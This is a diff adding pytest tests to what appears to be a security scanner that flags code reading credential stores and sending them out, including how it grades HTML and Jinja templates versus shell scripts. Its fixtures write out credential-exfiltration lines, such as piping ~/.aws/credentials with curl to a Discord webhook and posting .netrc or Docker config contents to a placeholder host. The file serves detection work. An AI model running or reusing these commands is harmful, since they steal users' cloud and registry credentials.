@@ -293,3 +293,111 @@ class TestFallsBackToText:
             'creds=$(cat ~/.docker/config.json)\n\n\n\ncurl -d "$creds" https://example.invalid\n'
         )
         assert StoreFlow.reaches(text, [1], [5], language="shell")
+
+
+class TestTextInAParsedFile:
+    """A store "read" that is only text inside a string, or an egress line that calls nothing, is not
+    a read or a send where the tree parses (reviews/pypi-98/20, shape A): a security tool's pattern
+    table, a help text naming `~/.aws/credentials`. An f-string's expressions are code."""
+
+    PATTERNS = (
+        "import re\n"
+        "RULES = '''\n"
+        "reads ~/.aws/credentials then posts it\n"
+        "requests.post(url, data=creds)\n"
+        "'''\n"
+        "def scan(text):\n"
+        "    return re.search(RULES, text)\n"
+    )
+
+    def test_a_store_named_in_a_multi_line_string_is_not_a_read(self) -> None:
+        assert not PythonFlowKit.flows(self.PATTERNS, ".aws/credentials", "requests.post")
+
+    def test_an_egress_line_that_calls_nothing_is_not_a_send(self) -> None:
+        text = "creds = open('/root/.netrc').read()\nURL = 'https://example.invalid/upload'\n"
+        assert not StoreFlow.reaches(text, [1], [2], language="python")
+
+    def test_a_store_opened_and_posted_still_reaches(self) -> None:
+        text = (
+            "import os, requests\n"
+            "def go():\n"
+            "    creds = open(os.path.expanduser('~/.aws/credentials')).read()\n"
+            "    requests.post('https://example.invalid/', data=creds)\n"
+        )
+        assert PythonFlowKit.flows(text, ".aws/credentials", "requests.post")
+
+    def test_a_store_path_in_a_multi_line_f_string_that_is_opened_still_reaches(self) -> None:
+        text = (
+            "import os, requests\n"
+            "def go(home):\n"
+            "    path = f'''{home}\n"
+            "/.aws/credentials{os.sep}'''\n"
+            "    creds = open(path).read()\n"
+            "    requests.post('https://example.invalid/', data=creds)\n"
+        )
+        assert StoreFlow.reaches(text, [4], [6], language="python")
+
+
+class TestATemplateIsNotCode:
+    """Templates and markup are not read as code for this rule (reviews/pypi-98/20, shape C): a
+    store's name and a request in an HTML or Jinja template are text at scan time, even where the
+    template renders a script run later. A shell script, a Makefile, a Dockerfile or a CI step keep
+    their reading."""
+
+    SHELL = (
+        "#!/bin/sh\ncat ~/.aws/credentials | curl -s -d @- https://discord.com/api/webhooks/1/x\n"
+    )
+
+    def test_an_html_template_is_recorded_below_the_gate(self, tmp_path):
+        from cordon_scanner.foundation.models import Severity
+
+        page = "<html><body><pre>\n" + self.SHELL + "</pre></body></html>\n"
+        grades = TestTheGrade.grade(tmp_path, page, "app/templates/index.html")
+        assert all(g <= Severity.MEDIUM for g in grades), grades
+
+    def test_a_jinja_template_is_recorded_below_the_gate(self, tmp_path):
+        from cordon_scanner.foundation.models import Severity
+
+        grades = TestTheGrade.grade(tmp_path, self.SHELL, "app/templates/boot.sh.j2")
+        assert all(g <= Severity.MEDIUM for g in grades), grades
+
+    def test_a_shell_script_keeps_its_reading(self, tmp_path):
+        """Reported as it is today (the hand-run provisioning ceiling), not lowered as a template."""
+        grades = TestTheGrade.grade(tmp_path, self.SHELL, "app/boot.sh")
+        assert grades
+
+    @pytest.mark.parametrize(
+        "path",
+        [
+            "app/templates/index.html",
+            "x/page.htm",
+            "t/boot.sh.j2",
+            "t/a.jinja",
+            "t/a.jinja2",
+            "t/a.tmpl",
+            "t/a.mustache",
+            "t/a.hbs",
+        ],
+    )
+    def test_templates_and_markup(self, path: str) -> None:
+        from cordon_scanner.detect.code.capability.legitimate_use import LegitimateUse
+
+        assert LegitimateUse.is_template_or_markup(path)
+
+    @pytest.mark.parametrize(
+        "path",
+        [
+            ".github/workflows/ci.yml",
+            "app/boot.sh",
+            "Makefile",
+            "Dockerfile",
+            "a.ps1",
+            "a.bat",
+            "app/sync.py",
+            "x.tar.gz!pkg/setup.py",
+        ],
+    )
+    def test_what_runs_is_not_a_template(self, path: str) -> None:
+        from cordon_scanner.detect.code.capability.legitimate_use import LegitimateUse
+
+        assert not LegitimateUse.is_template_or_markup(path)
